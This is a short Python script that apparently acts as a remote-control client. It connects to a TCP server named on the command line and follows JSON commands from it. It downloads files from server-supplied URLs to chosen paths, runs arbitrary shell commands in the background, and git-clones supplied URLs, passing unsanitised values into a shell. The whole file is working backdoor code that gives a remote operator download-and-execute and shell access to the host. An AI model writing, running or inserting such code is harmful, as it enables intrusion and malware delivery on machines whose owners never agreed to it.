import socket
import sys
import json
import requests
import os
import subprocess

try:
    server_ip = sys.argv[1]
    server_port = int(sys.argv[2])
except IndexError:
    print("Not enough args")
    exit(1)


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((server_ip, server_port))  
try:
    while True:
        dt = sock.recv(1024)
        dict_dt = json.loads(dt.decode("utf-8"))
        
        if dict_dt["action"] == 2:
            data_dwnld = requests.get(dict_dt["url"])
            with open(dict_dt["save_path"], "wb") as out_file:
                out_file.write(data_dwnld.content)
        elif dict_dt["action"] == 3:
            #os.system(dict_dt["bash"])
            subprocess.Popen(f"{dict_dt['bash']} &", shell=True)
        elif dict_dt["action"] == 4:
            subprocess.Popen(f"git clone {dict_dt['actual_url']} &", shell=True)
            

except KeyboardInterrupt:
    sock.send(bytes(json.dumps({"action": 1}), encoding="utf-8"))